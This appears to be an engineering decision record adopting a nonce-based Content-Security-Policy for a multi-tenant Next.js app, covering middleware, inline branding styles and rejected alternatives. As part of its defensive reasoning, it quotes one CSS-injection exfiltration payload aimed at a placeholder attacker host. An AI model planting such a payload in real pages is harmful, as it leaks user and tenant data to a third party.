---
id: DEC-075
type: decision
title:
  CSP uses a per-request nonce on script-src and style-src, with no
  unsafe-inline
status: accepted
date: 2026-10-22
related_epics:
  - "EPIC-20"
related_decisions: []
related_stories:
  - "HARD-001"
prd_change_required: false
---

# DEC-075 — CSP with a per-request nonce, strict on scripts and styles

## Context

PRD §29 requires "CSP/HSTS/security headers". HSTS and the baseline header set
already exist; a search for `content-security-policy` across the repository
returns **zero matches**, so CSP is the one genuinely missing control.

Adding it is not a matter of appending a fixed string. Both Next.js and this
product's own branding layer emit inline resources:

```text
apps/web/src/app/layout.tsx:110        inline <script>  pre-paint appearance bootstrap
apps/web/src/app/layout.tsx:115        inline <style>   product brand preset variables
apps/web/src/app/(app)/layout.tsx:89   inline <script>  tenant bootstrap
apps/web/src/app/(app)/layout.tsx:93   inline <style>   TenantBranding overrides
apps/web/src/app/(portal)/layout.tsx   the same pair
```

The `<style>` nodes are load-bearing for correctness, not decoration: they carry
the resolved brand under `:root:not(.dark)` and the tenant override layered over
it, and they are emitted _before_ any paint-affecting node so the tenant never
sees a flash of the wrong brand. `apps/web/src/app/layout.test.tsx` pins that
ordering. A policy of `style-src 'self'` blocks both nodes and the tenant loses
its brand on first paint.

Next.js App Router additionally injects its own inline scripts for hydration and
streaming. Those are not authored here, so they cannot be rewritten to avoid
inline code.

## Question

Which CSP policy, given that inline `<script>` and `<style>` nodes cannot simply
be removed?

## Options

**A. Strict nonce on `script-src` and `style-src`.** Middleware mints a nonce
per request, sets the policy header, and every inline node in every layout
carries `nonce={...}`. No `unsafe-inline` anywhere.

**B. Nonce on `script-src`, `unsafe-inline` on `style-src`.** Script execution
is controlled (the real XSS vector) while styles stay permissive because Next
and the branding layer need them.

**C. Confinement directives only.** `frame-ancestors 'none'`,
`object-src 'none'`, `base-uri 'self'`, `form-action 'self'`. No `script-src`
and no `style-src`, so nothing can break — and nothing is mitigated except
clickjacking, plugin injection and base-tag hijacking.

**D. Static hash of the bootstrap script, `unsafe-inline` on styles.** Avoids
the middleware by hashing `appearanceBootstrapScriptWithTenantDefault(...)`.

## Decision

**A.**

1. **The nonce is per request**, generated in `apps/web/src/middleware.ts` and
   published on the request as `x-nonce` so server components can read it. The
   `Content-Security-Policy` header is set on the response in the same pass, so
   the policy and the document are produced from one value and cannot drift.
2. **Every inline node carries it.** The three layouts that emit inline
   `<script>`/`<style>` stamp `nonce` on each. The root layout's ordering
   guarantee is preserved: the nonce attribute does not move the node.
3. **No `unsafe-inline` on `script-src` or `style-src`.** A policy that leaves
   `style-src` open still permits CSS-injection data exfiltration
   (`background: url(https://attacker/?data=...)`), which is exactly the class
   of leak a CSP is expected to close on a surface that renders tenant-supplied
   branding values.
4. **The policy is a constant in one module and asserted verbatim by a test.**
   The test fails if anyone weakens a directive, which is the failure mode that
   matters: a quietly-added `unsafe-inline` is invisible in review and fatal to
   the control.
5. **Confinement directives come along**: `default-src 'self'`,
   `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'none'`,
   `form-action 'self'`. PRD §29's `img-src` allowance is explicit rather than
   inferred, because branding assets are served from the S3 bucket through
   signed URLs.

## Rejected: D, and why

The bootstrap script embeds the tenant's resolved default appearance
(`appearanceBootstrapScriptWithTenantDefault(defaultAppearance)`), so its bytes
differ per tenant and per appearance setting. A static `sha256-` hash would
therefore have to be computed per tenant per request — which is a nonce with
more steps and a second cache to invalidate.

Also rejected: developing against `Content-Security-Policy-Report-Only` in
production. A report-only header mitigates nothing and reads, in a deployment
audit, exactly like no CSP at all. The browser lane is where breakage is caught,
and it runs the built apps.

## Consequences

- A CSP violation that breaks the tenant's first paint becomes visible in the
  browser lane rather than in a report that nobody reads. That lane is the
  acceptance test for this decision, not the unit suite alone.
- Any future inline `<script>` or `<style>` in a layout must carry the nonce or
  it will be blocked. The test asserts the nonce is present on every inline node
  the layouts currently emit, so an added node fails a test rather than a paint.
- The API keeps its own header baseline unchanged: it serves JSON and redirects,
  never HTML, so a `script-src` there protects nothing. The web app is where the
  policy belongs, and `frame-ancestors 'none'` there is what closes clickjacking
  for the staff and portal surfaces.
